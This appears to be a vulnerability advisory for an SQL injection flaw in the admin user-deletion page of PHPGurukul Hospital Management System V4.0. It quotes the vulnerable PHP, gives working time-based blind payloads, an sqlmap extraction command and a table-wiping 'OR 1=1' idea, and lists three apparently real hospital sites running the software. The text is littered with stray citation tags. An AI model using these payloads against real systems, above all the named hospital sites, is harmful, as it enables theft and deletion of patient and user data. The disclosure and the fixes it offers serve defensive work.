# SQL Injection Vulnerability in PHPGurukul Hospital Management System (HMS) V4.0 (Admin Module)

## 1. Vulnerability Overview

| Field | Content |
| :--- | :--- |
| **System Name** | PHPGurukul Hospital Management System (HMS) |
| **Vendor Website** | [https://phpgurukul.com/](https://phpgurukul.com/) |
| **Affected Version** | V4.0 (Latest) and some older versions |
| **Vulnerability Type** | SQL Injection (SQLi) |
| **Vulnerable File** | `/hospital/hms/admin/manage-users.php` |
| **Severity** | **High/Critical** (Admin privilege abuse, Data Deletion, Information Leakage) |
| **Reporter** | yan1451 |
| **Date** | 2026-02-02 |

---

## 2. Vulnerability Description

A severe **SQL Injection vulnerability** was discovered in the backend user management module (`/hospital/hms/admin/manage-users.php`) of the **PHPGurukul Hospital Management System (HMS) V4.0**.

The system fails to validate input when processing administrator requests to delete users. [cite_start]The backend code directly retrieves the `id` parameter from the URL and concatenates it into a SQL `DELETE` statement without any input validation, filtering, or prepared statements[cite: 111].

Once an attacker acquires backend access (or via CSRF/XSS chaining), they can construct a malicious `id` parameter (e.g., containing Time-based Blind payloads) to execute arbitrary SQL commands. [cite_start]Crucially, because this occurs within a `DELETE` statement, an attacker can not only steal data via blind injection but can also inject a "universal true" condition (like `OR 1=1`) to **instantly wipe the entire user table**, causing a severe Denial of Service (DoS)[cite: 111].

---

## 3. Technical Analysis

### Vulnerable Code Logic
The vulnerability is located in `hospital/hms/admin/manage-users.php`.
Around line 12, the program assigns `$_GET['id']` to the `$uid` variable.
[cite_start]Around line 13, it directly executes the delete operation using `mysqli_query`[cite: 113].

**File:** `hospital/hms/admin/manage-users.php`

```php
// File: hospital/hms/admin/manage-users.php

if(isset($_GET['del']))
{
    $uid=$_GET['id']; // [Vulnerability] Direct input retrieval
    
    // [Vulnerability] Direct concatenation into DELETE statement without sanitization
    mysqli_query($con,"delete from users where id ='$uid'");
    
    $_SESSION['msg']="data deleted !!";
}
```

<img width="415" height="204" alt="f936a3dc6e6d0eb0f346573e93e0f10f" src="https://github.com/user-attachments/assets/e63befcf-0a97-4b09-9517-e52ac08a2295" />

---

## 4. Proof of Concept (Reproduction Steps)

1.  [cite_start]**Environment:** Windows 10 + phpStudy (Apache/MySQL)[cite: 121].
2.  **Access:** Log in to the Admin Dashboard and navigate to **Users -> Manage Users**.
3.  **Attack:** Construct a malicious URL containing a Time-based Blind payload:
    ```http
    http://localhost/hospital/hms/admin/manage-users.php?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+&del=delete
    ```
4.  [cite_start]**Execute:** Enter the URL in the browser address bar and press Enter[cite: 126, 127].
5.  **Result:** The server response time is approximately **5.04 seconds**, significantly exceeding the normal response time. [cite_start]This proves that the database successfully executed the `SLEEP(5)` command[cite: 128].

<img width="414" height="250" alt="425e1a188241759110fc5b6a5cd307c7" src="https://github.com/user-attachments/assets/4679ef8e-e35c-40b3-b77a-3abef7389841" />

---

## 5. Deep Verification & Automated Testing

To meet strict validation standards, the vulnerability was further verified using SQLMap and Burp Suite to confirm the ability to extract sensitive database fields.

### 5.1 Database Enumeration (SQLMap)
**Objective:** Extract database core fields.
**Tool:** SQLMap (Level 5, Risk 3).
**Command:**
```bash
python sqlmap.py -r manage_users.txt -p id --technique=T --level=5 --risk=3 --dbms=mysql --batch --current-user --current-db
```
**Result:** SQLMap successfully extracted the underlying database information:
* **Current User:** `'root@localhost'` (Highest Privilege)
* **Current Database:** `'hms'`
[cite_start][cite: 151, 152, 153]

<img width="414" height="161" alt="c433ce1564d73a947ec1d1606518abfd" src="https://github.com/user-attachments/assets/c5ab47e4-2098-4b20-ace4-39393217a7ba" />

### 5.2 Injection Logic Validation (Burp Suite)
**Objective:** Verify logic execution via Time-based Blind.
**Payload:** `id=9999' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+`
**Result:** The server response time reached **12,181 ms** (approx. 12 seconds). [cite_start]This delay confirms that the attacker's SQL statement was parsed and executed by the backend database[cite: 156, 157].

<img width="415" height="233" alt="60ceac7d875b5df893ef4e5e595487b6" src="https://github.com/user-attachments/assets/5aa90092-ed07-4182-80ff-3b026dd8740d" />

---

## 6. Publicly Affected Instances (Internet Case Studies)

A fingerprint search (Fingerprint: "Hospital Management System" / Admin Login / URL structure) confirmed that this software is widely deployed.

* [cite_start]**Case 1:** `http://beeyo.et/hms/` (Ethiopian medical site; login page matches fingerprint)[cite: 133, 134].
* [cite_start]**Case 2:** `http://apexcareshospital.com/hms/` (Apex Cares Hospital; backend path `/hms/admin/` matches)[cite: 136, 137].
* [cite_start]**Case 3:** `http://49.249.28.218:8081/.../hms/admin/` (IP-based site retaining full path characteristics)[cite: 139, 140].

*(Note: These examples are for fingerprint verification only; no active attacks were performed on these targets.)*

---

## 7. Remediation Suggestions

1.  **Use Prepared Statements:** Developers are strongly advised to use `prepare` and `bind_param` methods for SQL queries. [cite_start]This separates data from code and completely prevents SQL injection[cite: 142].
2.  [cite_start]**Integer Casting:** Since the `id` field is expected to be a number, force type conversion using `intval()` before using the parameter[cite: 143].

    **Secure Code Example:**
    ```php
    $uid = intval($_GET['id']);
    // Then use prepared statements...
    ```
